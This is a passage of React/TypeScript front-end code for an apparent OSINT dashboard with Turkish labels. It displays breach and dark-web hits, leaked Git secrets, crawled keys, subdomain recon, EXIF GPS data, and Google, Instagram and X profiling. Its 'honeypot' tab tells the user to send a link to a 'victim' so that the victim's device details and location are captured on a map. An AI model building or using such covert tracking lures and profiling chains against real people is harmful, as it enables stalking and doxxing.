                <span className="text-[12px] font-bold text-[#8A2BE2]">ROBIN AI TACTICAL ASSESSMENT</span>
              </div>
              <div className="text-[11px] font-mono text-white/90 leading-relaxed">
                {r.aiBrief}
              </div>
            </div>
          )}

          {ahmia.length > 0 && (
            <div>
              <SectionHeader title={`DARK WEB (.ONION) SONUÇLARI (${ahmia.length})`} icon={Globe} color="#8A2BE2" />
              <div className="space-y-2">
                {ahmia.slice(0, 20).map((res: any, i: number) => (
                  <div key={i} className="p-2 rounded bg-[#8A2BE2]/10 border border-[#8A2BE2]/30 flex flex-col gap-1">
                    <span className="text-[11px] font-mono font-bold text-white/90">{res.title}</span>
                    <div className="flex items-center gap-1">
                      <Lock className="w-3 h-3 text-[#8A2BE2]" />
                      <span className="text-[9px] font-mono text-[#8A2BE2] break-all">{res.url}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {breaches.length > 0 && (
            <div>
              <SectionHeader title={`VERİ İHLALLERİ (${breaches.length})`} icon={ShieldAlert} color="#FF3D3D" />
              <div className="space-y-1">
                {breaches.map((b: any, i: number) => (
                  <div key={i} className="text-[10px] font-mono p-1.5 rounded bg-[#FF3D3D]/10 text-[#FF3D3D] border border-[#FF3D3D]/30">
                    <span className="font-bold">{b.breach}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {pastes.length > 0 && (
            <div>
              <SectionHeader title={`PASTEBIN SIZINTILARI (${pastes.length})`} icon={FileText} color="#FF9500" />
              <div className="flex flex-wrap gap-1 mt-1">
                {pastes.map((p: any, i: number) => (
                  <span key={i} className="text-[9px] font-mono bg-[#FF9500]/10 border border-[#FF9500]/30 text-[#FF9500] px-1.5 py-0.5 rounded">
                    {p}
                  </span>
                ))}
              </div>
            </div>
          )}

          {github.length > 0 && (
            <div>
              <SectionHeader title={`GITHUB SIZINTILARI (${github.length})`} icon={Bug} color="#FF3D3D" />
              <div className="space-y-1">
                {github.map((g: any, i: number) => (
                  <a key={i} href={g} target="_blank" rel="noreferrer" className="block text-[9px] font-mono text-orange-400 hover:underline break-all truncate">
                    {g}
                  </a>
                ))}
              </div>
            </div>
          )}

          {(ahmia.length === 0 && breaches.length === 0 && pastes.length === 0 && github.length === 0) && (
             <div className="mt-4 text-[10px] font-mono text-[#00E676] bg-[#00E676]/10 p-2 rounded border border-[#00E676]/30">
             ✓ Deep Web ve Dark Web taramalarında herhangi bir riskli bulguya veya sızıntıya rastlanmadı.
           </div>
          )}
        </div>
      );
    }

    // ── GIT SECRETS ENUMERATION ──
    if (activeTab === 'git-secrets') {
      const findings: any[] = Array.isArray(r.findings) ? r.findings : [];
      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="GİT SECRETS ANALİZİ" icon={Bug} color="#FF3D3D" />
            <ResultRow label="Hedef" value={r.target || query} color="#FFF" />
            <ResultRow label="Taranan Kod" value={`${r.estimated_files || 0} Eşleşme İhtimali`} />
            <ResultRow label="Bulunan Sızıntı" value={findings.length} color={findings.length > 0 ? '#FF3D3D' : '#00E676'} />
          </div>

          {findings.length > 0 ? (
            <div>
              <SectionHeader title={`KRİTİK BULGULAR (${findings.length})`} icon={AlertTriangle} color="#FF3D3D" />
              <div className="space-y-2">
                {findings.map((f: any, i: number) => (
                  <div key={i} className="p-2 rounded bg-[#FF3D3D]/10 border border-[#FF3D3D]/30 flex flex-col gap-1 relative group">
                    <div className="flex items-center justify-between">
                      <span className="text-[11px] font-mono font-bold text-white/90">{f.repo}</span>
                      <a href={f.url} target="_blank" rel="noopener noreferrer" className="text-[10px] font-mono text-[#FF3D3D] hover:underline flex items-center gap-1">
                        Dosyaya Git <ExternalLink className="w-3 h-3" />
                      </a>
                    </div>
                    <span className="text-[9px] font-mono text-orange-400">{f.path}</span>
                    <div className="mt-1 bg-black/60 p-1.5 rounded border border-white/10 text-[9px] font-mono text-[#FF3D3D] whitespace-pre-wrap max-h-[80px] overflow-y-auto">
                      {f.snippet}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <div className="mt-4 text-[10px] font-mono text-[#00E676] bg-[#00E676]/10 p-2 rounded border border-[#00E676]/30">
              ✓ Hedefe ait açık kaynak kodlarda (public repo) herhangi bir .env, API Key veya parola sızıntısına rastlanmadı.
            </div>
          )}
        </div>
      );
    }

    // ── FULL RECON PIPELINE ──
    if (activeTab === 'recon') {
      const subs = r.subdomains?.subdomains || [];
      const ssl = r.ssl?.cert || {};
      const tech = r.tech || {};
      const headers = r.headers?.headers || {};
      
      return (
        <div className="space-y-4">
          <SectionHeader title="GÖRSEL KEŞİF (AQUATONE)" icon={Camera} color="#FFD700" />
          <div className="rounded overflow-hidden border border-[#FFD700]/30 bg-black/40 p-1">
            <img src={r.screenshot} alt="Visual Recon" className="w-full h-auto rounded opacity-80 hover:opacity-100 transition-opacity" loading="lazy" />
          </div>

          <SectionHeader title="TEKNOLOJİ VE GÜVENLİK" icon={Code} color="#9C27B0" />
          {r.waf && (
             <div className="mb-2 flex items-center justify-between p-2 rounded bg-[#FF3D3D]/10 border border-[#FF3D3D]/30">
               <span className="text-[10px] font-mono font-bold text-[#FF3D3D]">Web Application Firewall (WAF)</span>
               <span className="text-[10px] font-mono text-white bg-[#FF3D3D] px-1.5 py-0.5 rounded">{r.waf} Tespit Edildi</span>
             </div>
          )}
          <div className="flex flex-wrap gap-1.5">
            {Object.keys(tech).length > 0 ? Object.entries(tech).map(([t, info]: [string, any], i) => (
              <span key={i} className="text-[10px] font-mono bg-[#9C27B0]/10 border border-[#9C27B0]/30 text-[#9C27B0] px-1.5 py-0.5 rounded">
                {t} {info.version ? `v${info.version}` : ''}
              </span>
            )) : <span className="text-[10px] text-gray-500 font-mono">Tespit edilemedi</span>}
          </div>

          <SectionHeader title={`SUBDOMAIN HARİTASI (${subs.length})`} icon={Layers} color="#00BCD4" />
          <div className="max-h-[120px] overflow-y-auto pr-1 custom-scrollbar space-y-0.5">
            {subs.slice(0, 50).map((s: string, i: number) => (
              <div key={i} className="flex items-center gap-2 text-[10px] font-mono py-0.5 hover:bg-white/5 rounded px-1">
                <Network className="w-3 h-3 text-[#00BCD4]" />
                <span className="text-white/80">{s}</span>
              </div>
            ))}
            {subs.length > 50 && <div className="text-[9px] text-[#00BCD4] mt-1">+{subs.length - 50} daha...</div>}
          </div>

          <SectionHeader title="SSL/TLS SERTİFİKASI" icon={Shield} color="#76FF03" />
          <div className="bg-white/5 border border-white/10 rounded p-2 space-y-1">
            <ResultRow label="Kurum" value={ssl.subject?.O || ssl.subject?.CN || 'Bilinmiyor'} />
            <ResultRow label="Sağlayıcı" value={ssl.issuer?.O || ssl.issuer?.CN} />
            <ResultRow label="Geçerlilik" value={`${ssl.valid_from?.substring(0,10)} -> ${ssl.valid_to?.substring(0,10)}`} />
          </div>
        </div>
      );
    }

    // ── HONEYPOT TARGETS ──
    if (activeTab === 'honeypot') {
      return (
        <div>
          <SectionHeader title="HEDEF TAKİBİ (BUZZAĞI)" icon={Crosshair} color="#FF0033" />
          <div className="mb-4 text-[10px] font-mono text-[var(--text-muted)]">Bu linki kurbanınıza (hedefe) gönderin. Tıkladıkları anda cihaz bilgileri ve konumları haritada KIRMIZI yanıp sönen bir alarm olarak düşecektir.</div>
          <ResultRow label="Kampanya" value={r.name} color="#FFF" />
          <ResultRow label="Hedef ID" value={r.campaignId} color="#FF0033" />
          <div className="mt-3 bg-[#FF0033]/10 border border-[#FF0033]/30 p-2 rounded">
            <div className="text-[9px] font-mono text-[#FF0033] mb-1 font-bold">KOPYALANACAK LİNK:</div>
            <div className="text-[11px] font-mono text-white break-all select-all">{r.fullUrl}</div>
          </div>
          <div className="mt-3 flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-[#FF0033] animate-pulse"></div>
            <span className="text-[9px] font-mono text-[#FF0033]">Haritada dinleniyor...</span>
          </div>
        </div>
      );
    }

    // ── WEB CHECK (consolidated domain report) ──
    if (activeTab === 'webcheck') {
      const mc: any = r.mailConfig || {};
      const sec: any = r.httpSecurity || {};
      const hsts: any = r.hsts || {};
      const fw: any = r.firewall || {};
      const ai: any = r.aiProtection || {};
      const stxt: any = r.securityTxt || {};
      const arc: any = r.archives || {};
      const rk: any = r.rank || {};
      const ds: any = r.dnssec || {};
      const chain: string[] = (r.redirects && r.redirects.redirects) || [];
      const secEntries = Object.entries(sec).filter(([k]) => k !== 'status' && k !== 'error');

      return (
        <div>
          <SectionHeader title="HEDEF" icon={ShieldCheck} color="#00E676" />
          <ResultRow label="Host" value={r.hostname || query} color="#00E676" />
          {rk?.ranks?.length ? <ResultRow label="Tranco Sırası" value={`#${rk.ranks[0].rank}`} color="#FFD700" /> : null}
          {fw?.hasWaf ? <ResultRow label="WAF / CDN" value={fw.waf} color="#00E5FF" /> : (fw?.error ? null : <ResultRow label="WAF / CDN" value="none detected" />)}
          
          {ai?.protected && (
            <div className="bg-[#8A2BE2]/10 border border-[#8A2BE2]/40 rounded-lg p-2 flex items-center gap-2 mt-2">
              <Radar className="w-4 h-4 text-[#8A2BE2] animate-pulse" />
              <div>
                <div className="text-[10px] font-bold text-[#8A2BE2] font-mono tracking-widest">YAPAY ZEKA KALKANI TESPİT EDİLDİ (ANUBIS)</div>
                <div className="text-[9px] text-[#8A2BE2]/80 font-mono">Mekanizma: {ai.mechanism}</div>
              </div>
            </div>
          )}

          {/* Email security posture */}
          <SectionHeader title="EMAIL GÜVENLİĞİ" icon={Mail} color="#448AFF" />
          <div className="flex flex-wrap gap-1.5 mb-1">
            <StatusBadge ok={!!mc.spf} label="SPF" />
            <StatusBadge ok={!!mc.dmarc} label="DMARC" />
            <StatusBadge ok={!!mc.dkim} label="DKIM" />
            <StatusBadge ok={!!mc.bimi} label="BIMI" />
          </div>
          {Array.isArray(mc.mailServices) && mc.mailServices.length > 0 && (
            <ResultRow label="Mail Sağlayıcı" value={mc.mailServices.map((m: any) => m.provider).join(', ')} />
          )}

          {/* HTTP security headers */}
          <SectionHeader title="HTTP GÜVENLİK BAŞLIKLARI" icon={Lock} color="#76FF03" />
          {sec.error ? (
            <div className="text-[10px] font-mono text-[var(--text-muted)]">{String(sec.error)}</div>
          ) : (
            <div className="flex flex-wrap gap-1.5">
              {secEntries.map(([k, v]) => (
                <StatusBadge key={k} ok={!!v} label={k.replace(/([A-Z])/g, ' $1').replace(/^./, (c) => c.toUpperCase()).trim()} />
              ))}
            </div>
          )}
          <div className="mt-1.5"><StatusBadge ok={!!hsts.compatible} label="HSTS PRELOAD" /></div>
          {hsts.message ? <div className="text-[9px] font-mono text-[var(--text-muted)] mt-1">↳ {hsts.message}</div> : null}

          {/* DNSSEC */}
          <SectionHeader title="DNSSEC" icon={Server} color="#E040FB" />
          <div className="flex flex-wrap gap-1.5">
            <StatusBadge ok={!!ds?.DNSKEY?.isFound} label="DNSKEY" />
            <StatusBadge ok={!!ds?.DS?.isFound} label="DS" />
            <StatusBadge ok={!!ds?.RRSIG?.isFound} label="RRSIG/AD" />
          </div>

          {/* security.txt */}
          <SectionHeader title="SECURITY.TXT" icon={FileText} color="#FF9500" />
          {stxt.isPresent ? (
            <>
              <ResultRow label="Bulunduğu Yer" value={stxt.foundIn} color="#00E676" />
              {stxt.fields?.Contact ? <ResultRow label="İletişim" value={stxt.fields.Contact} /> : null}
              {stxt.fields?.Expires ? <ResultRow label="Bitiş" value={stxt.fields.Expires} /> : null}
              <ResultRow label="PGP İmzalı" value={stxt.isPgpSigned ? 'yes' : 'no'} />
            </>
          ) : (
            <div className="text-[10px] font-mono text-[var(--text-muted)]">Not present</div>
          )}

          {/* Redirects */}
          {chain.length > 1 && (
            <>
              <SectionHeader title={`YÖNLENDİRME ZİNCİRİ (${chain.length})`} icon={ExternalLink} color="#87CEEB" />
              <div className="space-y-0.5">
                {chain.map((c, i) => (
                  <div key={i} className="text-[9px] font-mono text-[var(--text-secondary)] break-all">{i + 1}. {c}</div>
                ))}
              </div>
            </>
          )}

          {/* Archive history */}
          <SectionHeader title="WAYBACK GEÇMİŞİ" icon={Clock} color="#00BCD4" />
          {arc.daysArchived ? (
            <>
              <ResultRow label="Arşiv Günü" value={arc.daysArchived} color="#00BCD4" />
              <ResultRow label="İlk Görülme" value={arc.firstScan ? new Date(arc.firstScan).toLocaleDateString() : '—'} />
              <ResultRow label="Son Görülme" value={arc.lastScan ? new Date(arc.lastScan).toLocaleDateString() : '—'} />
              <ResultRow label="İçerik Değişikliği" value={arc.changeCount} />
            </>
          ) : (
            <div className="text-[10px] font-mono text-[var(--text-muted)]">{arc.skipped || arc.error || 'No data'}</div>
          )}
        </div>
      );
    }

    // ── PHOTO / EXIF ──
    if (activeTab === 'exif') {
      const gps = r.gps;
      const cam = r.camera || {};
      const extra = r.extra || {};
      return (
        <div>
          <SectionHeader title="FOTO METAVERİSİ" icon={Aperture} color="#00E5FF" />
          <ResultRow label="EXIF" value={r.hasExif ? 'VAR' : 'YOK'} color={r.hasExif ? '#00E676' : '#FF9500'} />
          <ResultRow label="Boyut" value={r.dimensions?.width ? `${r.dimensions.width}×${r.dimensions.height}` : '—'} />
          <ResultRow label="Dosya" value={r.bytes ? `${(r.bytes / 1024).toFixed(0)} KB` : '—'} />
          {!r.hasExif && (
            <div className="mt-2 text-[10px] font-mono text-[var(--text-muted)]">Bu görselde EXIF verisi yok (sosyal medya genelde metaveriyi siler).</div>
          )}

          {(cam.make || cam.model || cam.lens || cam.software) && (
            <>
              <SectionHeader title="KAMERA" icon={Camera} color="#FFD700" />
              <ResultRow label="Marka" value={cam.make} />
              <ResultRow label="Model" value={cam.model} color="#FFD700" />
              <ResultRow label="Lens" value={cam.lens} />
              <ResultRow label="Yazılım" value={cam.software} />
            </>
          )}
          {r.dateTaken && <ResultRow label="Çekim Tarihi" value={new Date(r.dateTaken).toLocaleString('tr-TR')} color="#00E5FF" />}

          {Object.keys(extra).length > 0 && (
            <>
              <SectionHeader title="DETAYLAR" icon={FileText} color="#666" />
              {Object.entries(extra).map(([k, v]) => <ResultRow key={k} label={k} value={String(v)} />)}
            </>
          )}

          <SectionHeader title="KONUM (GPS)" icon={MapPin} color={gps ? '#FF3D3D' : '#666'} />
          {gps ? (
            <>
              <ResultRow label="Koordinat" value={`${gps.lat.toFixed(6)}, ${gps.lng.toFixed(6)}`} color="#FF3D3D" />
              <div className="flex gap-1.5 mt-2">
                <button onClick={() => onScanGeolocate?.(r.url, { lat: gps.lat, lng: gps.lng, type: 'exif', region: 'Foto GPS' })}
                  className="px-3 py-1.5 rounded text-[10px] font-mono font-bold flex items-center gap-1.5"
                  style={{ backgroundColor: '#FF3D3D20', border: '1px solid #FF3D3D40', color: '#FF3D3D' }}>
                  <MapPin className="w-3 h-3" /> Haritada Göster
                </button>
                <a href={`https://www.google.com/maps?q=${gps.lat},${gps.lng}`} target="_blank" rel="noopener noreferrer"
                  className="px-3 py-1.5 rounded text-[10px] font-mono flex items-center gap-1.5 border border-white/10 text-[var(--text-secondary)] hover:text-[var(--cyan-primary)]">
                  Google Maps ↗
                </a>
              </div>
            </>
          ) : (
            <div className="text-[10px] font-mono text-[var(--text-muted)]">Bu görselde GPS konum verisi yok.</div>
          )}
        </div>
      );
    }

    // ── NAME PERMUTE (identity permutations) ──
    if (activeTab === 'permute') {
      const usernames: string[] = r.usernames || [];
      const emails: string[] = r.emails || [];
      const pivot = (tab: string, val: string) => { setActiveTab(tab); setQuery(val); setResults(null); };
      return (
        <div>
          <SectionHeader title="KİMLİK PERMÜTASYONLARI" icon={UserSearch} color="#FFD700" />
          <ResultRow label="Ad" value={r.name || query} color="#FFD700" />
          <div className="text-[9px] font-mono text-[var(--text-muted)] mb-1">Click a username → USERNAME hunt · click an email → EMAIL check</div>

          <SectionHeader title={`KULLANICI ADLARI (${usernames.length})`} icon={UserSearch} color="#00E676" />
          <div className="flex flex-wrap gap-1">
            {usernames.map((u) => (
              <button key={u} onClick={() => pivot('username', u)}
                className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-[#00E676]/30 text-[#00E676] hover:bg-[#00E676]/15 transition-colors">
                {u}
              </button>
            ))}
          </div>

          <SectionHeader title={`EMAİLLER (${emails.length})`} icon={Mail} color="#448AFF" />
          <div className="flex flex-wrap gap-1">
            {emails.map((e) => (
              <button key={e} onClick={() => pivot('email', e)}
                className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-[#448AFF]/30 text-[#448AFF] hover:bg-[#448AFF]/15 transition-colors break-all">
                {e}
              </button>
            ))}
          </div>
        </div>
      );
    }

    // ── WEB ARCHIVE (SingleFile) ──
    if (activeTab === 'archive') {
      return (
        <div>
          <SectionHeader title="WEB ARŞİV" icon={FileText} color="#FF6E40" />
          <ResultRow label="Kaynak URL" value={r.url || query} color="#FF6E40" />
          <ResultRow label="Boyut" value={r.bytes ? `${(r.bytes / 1024).toFixed(1)} KB` : '—'} />
          <ResultRow label="Süre" value={r.elapsedMs ? `${(r.elapsedMs / 1000).toFixed(1)}s` : '—'} />
          {r.publicPath && (
            <a href={r.publicPath} target="_blank" rel="noopener noreferrer"
              className="mt-2 inline-flex items-center gap-2 px-3 py-1.5 rounded border border-[#FF6E40]/40 bg-[#FF6E40]/10 text-[#FF6E40] text-[11px] font-mono hover:bg-[#FF6E40]/20 transition-colors">
              <FileText className="w-3.5 h-3.5" /> Open archived snapshot ↗
            </a>
          )}
          <div className="mt-2 text-[9px] font-mono text-[var(--text-muted)]">Saved offline as a single self-contained HTML file — preserved as evidence.</div>
        </div>
      );
    }

    // ── GOOGLE OSINT (GHunt) ──
    if (activeTab === 'google') {
      const d: any = r.data || {};
      // GHunt schema varies; surface the common spots defensively.
      const prof = d.profile || d.PROFILE_CONTAINER?.profile || d;
      const name = prof?.name || prof?.names?.[0]?.fullname || d?.name;
      const gaia = prof?.personId || prof?.gaiaID || prof?.gaia_id || d?.gaiaID;
      const pic = prof?.profilePhotos?.PROFILE?.url || prof?.profile_pic || prof?.profilePhotoUrl;
      const emails = prof?.emails ? Object.keys(prof.emails) : [];
      return (
        <div>
          <SectionHeader title="GOOGLE HESABI" icon={Mail} color="#4285F4" />
          <div className="flex items-center gap-3 mb-2">
            {pic && <img src={pic} alt="pfp" referrerPolicy="no-referrer" className="w-11 h-11 rounded-full border border-[#4285F4]/40" />}
            <div className="min-w-0">
              <div className="text-[12px] font-mono font-bold text-[var(--text-primary)] truncate">{name || r.email}</div>
              <div className="text-[10px] font-mono text-[var(--text-muted)] truncate">{r.email}</div>
            </div>
          </div>
          {gaia && <ResultRow label="Gaia ID" value={gaia} color="#4285F4" />}
          {emails.length > 0 && <ResultRow label="Emailler" value={emails.join(', ')} color="#00E676" />}
          {prof?.lastProfileEdit && <ResultRow label="Son Profil Düzenleme" value={String(prof.lastProfileEdit)} />}
          <SectionHeader title="HAM GHUNT ÇIKTISI" icon={Terminal} color="#666" />
          <pre className="text-[8px] font-mono text-[var(--text-secondary)] whitespace-pre-wrap break-all max-h-[400px] overflow-y-auto p-2 rounded border border-white/10 bg-black/30">
            {JSON.stringify(d, null, 2).slice(0, 8000)}
          </pre>
        </div>
      );
    }

    // ── INSTAGRAM ──
    if (activeTab === 'instagram') {
      const posts: any[] = r.recent_posts || [];
      const num = (n: number) => n >= 1000 ? (n / 1000).toFixed(1).replace(/\.0$/, '') + 'K' : String(n);
      return (
        <div>
          <SectionHeader title="INSTAGRAM PROFİLİ" icon={Camera} color="#E1306C" />
          <div className="flex items-center gap-3 mb-2">
            {r.profile_pic_url && <img src={r.profile_pic_url} alt="pfp" referrerPolicy="no-referrer" className="w-11 h-11 rounded-full border border-[#E1306C]/40" />}
            <div className="min-w-0">
              <div className="flex items-center gap-1 text-[12px] font-mono font-bold text-[var(--text-primary)] truncate">
                {r.full_name || r.username}
                {r.is_verified && <BadgeCheck className="w-3.5 h-3.5 text-[#E1306C] shrink-0" />}
                {r.is_private && <Lock className="w-3 h-3 text-[var(--text-muted)] shrink-0" />}
              </div>
              <div className="text-[10px] font-mono text-[var(--text-muted)]">@{r.username}</div>
            </div>
          </div>
          {r.biography && <div className="text-[10px] font-mono text-[var(--text-secondary)] mb-2 whitespace-pre-wrap">{r.biography}</div>}
          <div className="flex gap-3 mb-1 text-[10px] font-mono">
            <span><b className="text-[var(--text-primary)]">{num(r.followers)}</b> <span className="text-[var(--text-muted)]">followers</span></span>
            <span><b className="text-[var(--text-primary)]">{num(r.following)}</b> <span className="text-[var(--text-muted)]">following</span></span>
            <span><b className="text-[var(--text-primary)]">{num(r.posts)}</b> <span className="text-[var(--text-muted)]">posts</span></span>
          </div>
          {r.external_url && <ResultRow label="Bağlantı" value={r.external_url} color="#E1306C" />}
          {r.is_business && <ResultRow label="İşletme" value={r.business_category || 'yes'} />}
          <ResultRow label="Gizli" value={r.is_private ? 'YES 🔒' : 'no'} color={r.is_private ? '#FF9500' : undefined} />
          <ResultRow label="Kullanıcı ID" value={r.userid} />

          {r.is_private && (
            <div className="mt-2 text-[10px] font-mono text-orange-400">Private account — posts not accessible.</div>
          )}
          {posts.length > 0 && (
            <>
              <SectionHeader title={`SON GÖNDERİLER (${posts.length})`} icon={Terminal} color="#E1306C" />
              <div className="space-y-1.5">
                {posts.map((p: any, i: number) => (
                  <a key={i} href={p.url} target="_blank" rel="noopener noreferrer"
                    className="block p-2 rounded border border-white/10 hover:border-[#E1306C]/40 transition-colors">
                    <div className="text-[10px] font-mono text-[var(--text-secondary)] whitespace-pre-wrap break-words line-clamp-3">{p.caption || '(no caption)'}</div>
                    <div className="flex items-center gap-3 mt-1 text-[9px] font-mono text-[var(--text-muted)]">
                      <span>{p.date ? new Date(p.date).toLocaleDateString() : ''}</span>
                      <span className="flex items-center gap-0.5"><Heart className="w-2.5 h-2.5" />{num(p.likes)}</span>
                      <span>💬 {num(p.comments)}</span>
                      {p.is_video && <span>🎥</span>}
                    </div>
                  </a>
                ))}
              </div>
            </>
          )}
        </div>
      );
    }

    // ── TWITTER / X ──
    if (activeTab === 'twitter') {
      const p = r.profile;
      if (!p) return renderFallback();
      const tweets: any[] = r.recentTweets || [];
      const joined = p.created_at ? new Date(p.created_at).toLocaleDateString() : '—';
      const num = (n: number) => n >= 1000 ? (n / 1000).toFixed(1).replace(/\.0$/, '') + 'K' : String(n);
      return (
        <div>
          <SectionHeader title="X PROFİLİ" icon={AtSign} color="#1DA1F2" />
          <div className="flex items-center gap-3 mb-2">
            {p.profile_image_url && <img src={p.profile_image_url} alt="pfp" className="w-11 h-11 rounded-full border border-[#1DA1F2]/40" />}
            <div className="min-w-0">
              <div className="flex items-center gap-1 text-[12px] font-mono font-bold text-[var(--text-primary)] truncate">
                {p.name}
                {p.verified && <BadgeCheck className="w-3.5 h-3.5 text-[#1DA1F2] shrink-0" />}
              </div>
              <div className="text-[10px] font-mono text-[var(--text-muted)]">@{p.username}{p.protected ? ' · 🔒 protected' : ''}</div>
            </div>
          </div>
          {p.description && <div className="text-[10px] font-mono text-[var(--text-secondary)] mb-2 whitespace-pre-wrap">{p.description}</div>}
          <div className="flex gap-3 mb-1 text-[10px] font-mono">
            <span><b className="text-[var(--text-primary)]">{num(p.followers)}</b> <span className="text-[var(--text-muted)]">followers</span></span>
            <span><b className="text-[var(--text-primary)]">{num(p.following)}</b> <span className="text-[var(--text-muted)]">following</span></span>
            <span><b className="text-[var(--text-primary)]">{num(p.tweets)}</b> <span className="text-[var(--text-muted)]">posts</span></span>
          </div>
          <ResultRow label="Katılım" value={joined} />
          {p.location && <ResultRow label="Konum" value={p.location} />}
          {p.url && <ResultRow label="Bağlantı" value={p.url} color="#1DA1F2" />}
          {p.verified_type && <ResultRow label="Doğrulanmış" value={p.verified_type} color="#1DA1F2" />}
          <ResultRow label="Kullanıcı ID" value={p.id} />

          {tweets.length > 0 && (
            <>
              <SectionHeader title={`SON GÖNDERİLER (${tweets.length})`} icon={Terminal} color="#1DA1F2" />
              <div className="space-y-1.5">
                {tweets.map((t: any, i: number) => (
                  <a key={i} href={t.url} target="_blank" rel="noopener noreferrer"
                    className="block p-2 rounded border border-white/10 hover:border-[#1DA1F2]/40 transition-colors">
                    <div className="text-[10px] font-mono text-[var(--text-secondary)] whitespace-pre-wrap break-words">{t.text}</div>
                    <div className="flex items-center gap-3 mt-1 text-[9px] font-mono text-[var(--text-muted)]">
                      <span>{t.created_at ? new Date(t.created_at).toLocaleDateString() : ''}</span>
                      <span className="flex items-center gap-0.5"><Heart className="w-2.5 h-2.5" />{num(t.likes)}</span>
                      <span className="flex items-center gap-0.5"><Repeat2 className="w-2.5 h-2.5" />{num(t.retweets)}</span>
                    </div>
                  </a>
                ))}
              </div>
            </>
          )}
        </div>
      );
    }

    if (activeTab === 'crawl') {
      const emails: string[] = r.emails || [];
      const social: string[] = r.social || [];
      const secrets: any[] = r.secrets || [];
      const ext: string[] = r.externalLinks || [];
      const js: string[] = r.jsFiles || [];
      const jsEndpoints: string[] = r.jsEndpoints || [];
      const Chip = ({ items, color, max = 60 }: { items: string[]; color: string; max?: number }) => (
        <div className="flex flex-wrap gap-1">
          {items.slice(0, max).map((x, i) => (
            <span key={i} className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-white/10 text-[var(--text-secondary)] break-all" style={{ borderColor: `${color}30` }}>{x}</span>
          ))}
          {items.length > max && <span className="text-[9px] font-mono text-[var(--text-muted)]">+{items.length - max} more</span>}
        </div>
      );
      return (
        <div>
          <SectionHeader title="WEB TARAYICI" icon={Network} color="#9C27B0" />
          <ResultRow label="Hedef" value={r.target || query} color="#9C27B0" />
          <ResultRow label="Taranan Sayfa" value={r.pagesCrawled} color="#9C27B0" />
          <ResultRow label="Geçen Süre" value={r.elapsedMs ? `${(r.elapsedMs / 1000).toFixed(1)}s` : '—'} />

          {secrets.length > 0 && (
            <>
              <SectionHeader title={`SIRLAR / ANAHTARLAR (${secrets.length})`} icon={ShieldAlert} color="#FF3D3D" />
              <div className="space-y-0.5">
                {secrets.slice(0, 30).map((s: any, i: number) => (
                  <div key={i} className="text-[9px] font-mono break-all">
                    <span className="text-red-400">{s.type}:</span> <span className="text-[var(--text-secondary)]">{s.value}</span>
                  </div>
                ))}
              </div>
            </>
          )}

          <SectionHeader title={`EMAİLLER (${emails.length})`} icon={Mail} color="#448AFF" />
          {emails.length ? <Chip items={emails} color="#448AFF" /> : <div className="text-[10px] font-mono text-[var(--text-muted)]">none found</div>}

          {social.length > 0 && (<><SectionHeader title={`SOSYAL PROFİLLER (${social.length})`} icon={UserSearch} color="#00E676" /><Chip items={social} color="#00E676" /></>)}
          {jsEndpoints.length > 0 && (
            <>
              <SectionHeader title={`JS ENDPOINTS (${jsEndpoints.length})`} icon={Code} color="#00E676" />
              <Chip items={jsEndpoints} color="#00E676" max={100} />
            </>
          )}

          {ext.length > 0 && (<><SectionHeader title={`DIŞ ALAN ADLARI (${ext.length})`} icon={Globe} color="#00BCD4" /><Chip items={ext} color="#00BCD4" /></>)}
          {js.length > 0 && (<><SectionHeader title={`JS DOSYALARI (${js.length})`} icon={Code} color="#87CEEB" /><Chip items={js} color="#87CEEB" max={40} /></>)}
          {Array.isArray(r.ips) && r.ips.length > 0 && (<><SectionHeader title={`IP'LER (${r.ips.length})`} icon={Server} color="#FFD700" /><Chip items={r.ips} color="#FFD700" /></>)}
        </div>
      );
    }

    // ── PASSIVE SUBDOMAIN ENUMERATION ──
    if (activeTab === 'subenum') {
      const subs: any[] = Array.isArray(r.subdomains) ? r.subdomains : [];
      const srcCounts: Record<string, number> = r.sources || {};
      return (
        <div>
          <SectionHeader title="SUBDOMAIN KEŞFİ" icon={Layers} color="#00BCD4" />
          <ResultRow label="Alan Adı" value={r.domain || query} color="#00BCD4" />
          <ResultRow label="Bulunan" value={r.total ?? 0} color="#00BCD4" />
          <ResultRow label="Canlı (çözümlenen)" value={r.alive ?? 0} color="#00E676" />
          <ResultRow label="Geçen Süre" value={r.elapsedMs ? `${(r.elapsedMs / 1000).toFixed(1)}s` : '—'} />

          <SectionHeader title="KAYNAKLAR" icon={Globe} color="#666" />
          <div className="flex flex-wrap gap-1">
            {Object.entries(srcCounts).map(([k, v]) => (
              <span key={k} className={`text-[8px] font-mono px-1.5 py-0.5 rounded border ${v ? 'text-cyan-300 border-cyan-500/30' : 'text-[var(--text-muted)] border-white/10'}`}>{k}:{v}</span>
            ))}
          </div>

          {subs.length > 0 && (
            <>
              <SectionHeader title={`HOSTLAR (${subs.length})`} icon={Server} color="#00BCD4" />
          <div className="space-y-0.5 max-h-[400px] overflow-y-auto">
                {subs.slice(0, 400).map((s: any, i: number) => (
                  <div key={i} className="flex items-center gap-2 py-0.5 px-2 rounded hover:bg-[var(--hover-accent)]">
                    <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${s.alive ? 'bg-green-400' : 'bg-gray-600'}`} />
                    <span className="text-[10px] font-mono text-[var(--text-primary)] flex-1 truncate">{s.host}</span>
                    {s.ip && <span className="text-[9px] font-mono text-[var(--cyan-primary)]">{s.ip}</span>}
                  </div>
                ))}
                {subs.length > 400 && <div className="text-[9px] font-mono text-[var(--text-muted)] px-2 pt-1">+{subs.length - 400} more…</div>}
              </div>
            </>
          )}
        </div>
      );
    }

    // ── EMAIL ACCOUNT ENUMERATION (holehe + leaks + pastes) ──
    if (activeTab === 'email') {
      const found: any[] = Array.isArray(r.found) ? r.found : [];
      const all: any[] = Array.isArray(r.results) ? r.results : [];
      const breaches = r.breaches?.BreachesDetails || [];
      const pastes = r.pastes?.searchResult || [];

      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="EMAIL KEŞİF (HESAPLAR)" icon={Mail} color="#448AFF" />
            <ResultRow label="Email" value={r.email || query} color="#448AFF" />
            <ResultRow label="Bulunan Hesap" value={found.length} color={found.length > 0 ? '#00E676' : '#FF9500'} />
